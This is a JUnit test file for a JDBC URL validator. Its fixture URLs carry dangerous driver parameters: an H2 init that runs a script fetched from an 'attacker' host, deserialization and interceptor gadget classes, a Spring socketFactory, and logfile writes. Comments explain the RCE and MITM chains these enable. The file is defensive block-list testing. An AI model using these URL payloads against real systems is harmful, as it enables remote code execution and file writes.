/*
 * Copyright 2026 Philterd, LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 */
package ai.philterd.arbiter.service;

import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Coverage for the recently-extended JDBC URL parameter block-list. Each test names a
 * specific driver feature that has been used in published RCE / file-read / MITM chains
 * and confirms that {@link JdbcUrlValidator} refuses a URL carrying it, regardless of
 * how the parameter is cased or where in the URL it appears.
 *
 * <p>The base allow-list is the production default ({@code postgresql, mysql, mariadb,
 * sqlserver, oracle, db2}) so each fixture URL uses one of those drivers — otherwise
 * the URL would be refused at the driver-allow-list step before the param check fires.
 */
class JdbcUrlValidatorDangerousParamsTest {

    /** No host allow-list configured — these tests focus solely on URL-parameter rejection. */
    private final JdbcUrlValidator validator = new JdbcUrlValidator(new DataSourceHostAllowList(""));

    private void assertRejectedWithReason(final String url, final String reasonContains) {
        final JdbcUrlValidator.Result r = validator.validate(url);
        assertFalse(r.ok(), "expected rejection for: " + url);
        assertNotNull(r.error());
        assertTrue(r.error().toLowerCase().contains(reasonContains.toLowerCase()),
                "expected error to mention '" + reasonContains + "', got: " + r.error());
    }

    // ---------- previously-covered parameters (regression) ----------

    @Test
    void h2InitParamStillRefused() {
        // H2 isn't on the allow-list either, but the param-level check fires first for
        // a non-h2 URL that smuggles an `init=` value.
        assertRejectedWithReason(
                "jdbc:mysql://host:3306/db?init=RUNSCRIPT FROM 'http://attacker/x.sql'",
                "init=");
    }

    @Test
    void mysqlAutoDeserializeStillRefused() {
        assertRejectedWithReason(
                "jdbc:mysql://host:3306/db?autoDeserialize=true",
                "autodeserialize");
    }

    @Test
    void postgresqlSocketFactoryStillRefused() {
        assertRejectedWithReason(
                "jdbc:postgresql://host:5432/db?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext",
                "socketfactory");
    }

    // ---------- newly-added parameters ----------

    @Test
    void mysqlQueryInterceptorsRefused() {
        // MySQL Connector/J pre-8.0.20 RCE: queryInterceptors loads any class on the
        // classpath at connect time and invokes a no-arg constructor.
        assertRejectedWithReason(
                "jdbc:mysql://host:3306/db"
                        + "?queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
                "queryinterceptors");
    }

    @Test
    void mysqlStatementInterceptorsRefused() {
        // Pre-Connector/J 6.0 the same lever was spelled statementInterceptors. Refuse
        // both spellings.
        assertRejectedWithReason(
                "jdbc:mysql://host:3306/db?statementInterceptors=com.example.Evil",
                "statementinterceptors");
    }

    @Test
    void mysqlPropertiesTransformRefused() {
        // SnakeYAML deserialization gadget — propertiesTransform loads an arbitrary
        // class implementing ConnectionPropertiesTransform.
        assertRejectedWithReason(
                "jdbc:mysql://host:3306/db?propertiesTransform=com.example.YamlGadget",
                "propertiestransform");
    }

    @Test
    void mysqlAllowPublicKeyRetrievalRefused() {
        // Even alone it's a MITM vector: forces the client to fetch the server's RSA
        // public key over the same TCP socket as the auth handshake, before TLS.
        assertRejectedWithReason(
                "jdbc:mysql://host:3306/db?allowPublicKeyRetrieval=true",
                "allowpublickeyretrieval");
    }

    @Test
    void postgresqlCurrentSchemaRefused() {
        // currentSchema gets interpolated into SET search_path in older PostgreSQL
        // drivers, providing a small SQLi surface and an oracle for schema names.
        assertRejectedWithReason(
                "jdbc:postgresql://host:5432/db?currentSchema=public,$$user$$",
                "currentschema");
    }

    @Test
    void databaseMetadataCacheTtlRefused() {
        // Driver-side cache used in a couple of second-order injection chains; not
        // needed for read-only ingest.
        assertRejectedWithReason(
                "jdbc:mysql://host:3306/db?databaseMetadataCacheTTL=999999",
                "databasemetadatacachettl");
    }

    @Test
    void loggerOrLogFileFileWriteRefused() {
        // logger / logfile let the driver write to an arbitrary path with the JVM's
        // file permissions — refused outright since data sources have no legitimate
        // need to redirect JDBC driver logging.
        assertRejectedWithReason(
                "jdbc:mysql://host:3306/db?logger=Slf4JLogger&logfile=/tmp/jvm-write",
                "logger=");
    }

    @Test
    void caseInsensitiveDetectionStillTriggers() {
        // The block-list scan is case-insensitive — defenders shouldn't depend on the
        // admin spelling the parameter the way the driver canonicalizes it.
        assertRejectedWithReason(
                "jdbc:mysql://host:3306/db?QUERYINTERCEPTORS=Evil",
                "queryinterceptors");
        assertRejectedWithReason(
                "jdbc:mysql://host:3306/db?AllowPublicKeyRetrieval=TRUE",
                "allowpublickeyretrieval");
    }

    // ---------- legitimate URLs still pass ----------

    @Test
    void plainServerJdbcUrlIsAccepted() {
        // Sanity: a clean URL with no dangerous parameters must pass the validator.
        final JdbcUrlValidator.Result r =
                validator.validate("jdbc:postgresql://host:5432/db");
        assertTrue(r.ok(), "expected acceptance, got: " + r.error());
    }

    @Test
    void benignParametersAreAccepted() {
        // useUnicode, characterEncoding, connectTimeout, useSSL=true — these don't
        // overlap any DANGEROUS_PARAMS substring and should pass.
        final JdbcUrlValidator.Result r = validator.validate(
                "jdbc:mysql://host:3306/db"
                        + "?useUnicode=true&characterEncoding=UTF-8&connectTimeout=5000&useSSL=true");
        assertTrue(r.ok(), "expected acceptance, got: " + r.error());
    }
}
